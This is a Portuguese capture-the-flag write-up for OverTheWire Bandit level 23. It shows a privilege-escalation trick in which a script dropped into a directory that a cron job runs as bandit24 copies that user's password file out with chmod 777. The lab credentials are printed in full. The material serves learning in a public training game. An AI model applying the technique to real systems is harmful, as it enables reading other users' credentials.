# Level 23
**Tópicos**

- [X] [Goal](#goal)
- [X] [Comandos para o desafio](#comandos-para-esse-level)
- [X] [Um pouco de Teoria](#teoria)
- [X] [Write Up](#write-up)
- [X] [Solução](#soluçao)
- [X] [Resources](#resources)

## Goal
Um programa está rodando automaticamente em intervalos regulares do cron, o agendador de tarefas baseado em tempo. Procure em /etc/cron.d/ a configuração e veja qual comando está sendo executado.

*NOTE: Este nível requer que você crie seu próprio primeiro shell-script. Este é um passo muito grande e você deve se orgulhar de si mesmo ao vencer este nível!*

*NOTE: Lembre-se de que seu script de shell é removido após a execução, portanto, convém manter uma cópia por perto…*

## Comandos para esse level
`cron`, `crontab`, `crontab(5)`

*Nota: Nem todos os comandos listados são necessários*

 Comandos  |                          O que faz?
 ----------|--------
 cron      |daemon (é um programa de computador que executa como um processo em plano de fundo) para executar comandos programados
 crontab   |manter arquivos crontab para usuários individuais
 crontab(5)|tabelas para conduzir o cron
 
 **Obs:** Para saber mais informações sobre como usar os comandos, possíveis flags, etc. Use `comando --help` para obter um "resumo" do manual, ou `man comando` para acessar o manual do comando.


## Teoria
É a mesma teoria do level 22.


## Write up
**Informações**
- Host Name: `bandit.labs.overthewire.org`
- Username: `bandit23`
- Password: `QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G`
- Port Number: `2220`

**Passo a Passo**

***[# Passo1.]*** Conectar e logar no SSH usando as informações acima.

***[# Passo2.]*** Seguindo o enunciado iremos entrar no diretório `/etc/cron.d` e ver o que tem lá usando `ls`.

***[# Passo3.]*** Há diversos arquivos no `/etc/cron.d`. Iremos ver o que tem no `cronjob_bandit24` usando `cat`, já que queremos a senha para o bandit24.

***[# Passo4.]*** O código dentro do `cronjob_bandit24` significa que em um período de tempo um comando é executado. O comando nesse caso é rodar um arquivo `.sh`, e a stdout e stderr são descartados. Dessa maneira, vamos dar uma olhada nesse arquivo `.sh`, usando `cat` novamente.

O código dentro do `.sh` será executado pelo usuário bandit24 e significa que existe uma pasta `/var/spool/bandit24/foo` e que todos os scripts que tem como proprietário o usuário bandit23 serão executados e depois de 60s serão excluído. 

Dessa forma, vamos escrever um script que pega a senha do **bandit24** e coloca em um arquivo. 

***[# Passo5.]*** Vamos criar uma pasta e ir para ela, em que escreveremos nosso script-shell. Feito isso, usando um editor de texto, escreveremos um script que pega a senha do **bandit24** e colocaria em um arquivo chamado `password` dentro da pasta que criamos.


***[# Passo6.]*** Mudaremos as permissões em toda a pasta, pois quando o nosso script for rodado pelo **bandit24** terá as permissões do **bandit24**. 

***[# Passo7.]*** Agora, devemos criar um arquivo vazio chamado `password` na pasta que criamos. E copiar o script para o diretório  `/var/spool/bandit24/foo`. 

***[# Passo8.]*** Por fim, basta esperar um minuto e acessar o arquivo `password`

***[# Passo9.]*** Para sair, rode `exit`

## Solução
<prep>
[# Passo1.] 

<b>> ssh bandit23@bandit.labs.overthewire.org -p 2220</b>

bandit23@bandit.labs.overthewire.org's password: <b>QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G</b>

[# Passo2.]

<b>bandit23@bandit:~$</b> cd /etc/cron.d

<b>bandit23@bandit:/etc/cron.d$</b> ls

cronjob_bandit15_root  cronjob_bandit23       e2scrub_all

cronjob_bandit17_root  cronjob_bandit24       otw-tmp-dir

cronjob_bandit22       cronjob_bandit25_root  sysstat

[# Passo3.]

<b>bandit23@bandit:/etc/cron.d$</b> cat cronjob_bandit24

@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null

* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null

[# Passo4.]

<b>bandit22@bandit:/etc/cron.d$</b> cat /usr/bin/cronjob_bandit24.sh

#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo

echo "Executing and deleting all scripts in /var/spool/$myname/foo:"

for i in * .*;

do

    if [ "$i" != "." -a "$i" != ".." ];

    then

        echo "Handling $i"

        owner="$(stat --format "%U" ./$i)"

        if [ "${owner}" = "bandit23" ]; then

            timeout -s 9 60 ./$i

        fi

        rm -f ./$i

    fi

done

[# Passo5.]

<b>bandit23@bandit:~$</b> mkdir /tmp/teste23

<b>bandit23@bandit:~$</b> cd /tmp/teste23

<b>bandit23@bandit:/tmp/teste23$</b> nano script.sh

<i>Editando o script.sh</i>

#!/bin/bash

cat /etc/bandit_pass/bandit24 > /tmp/teste23/password

[# Passo6.] 

<b>bandit23@bandit:/tmp/teste23$</b> chmod 777 -R /tmp/teste23

[# Passo7.] 

<b>bandit23@bandit:/tmp/teste23$</b> touch password

<b>bandit23@bandit:/tmp/teste23$</b> cp script.sh /var/spool/bandit24/foo

[# Passo8.] 

<b>bandit23@bandit:/tmp/teste23$</b> cat password

VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar

[# Passo9.] 
<b>bandit23@bandit:~$</b> exit

logout         

Connection to bandit.labs.overthewire.org closed.
</prep>

**Credenciais para o Level 24:**
- Username: `bandit24`
- Password: `VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar`

## Resources
[OverTheWire](https://overthewire.org/wargames/bandit/bandit24.html)

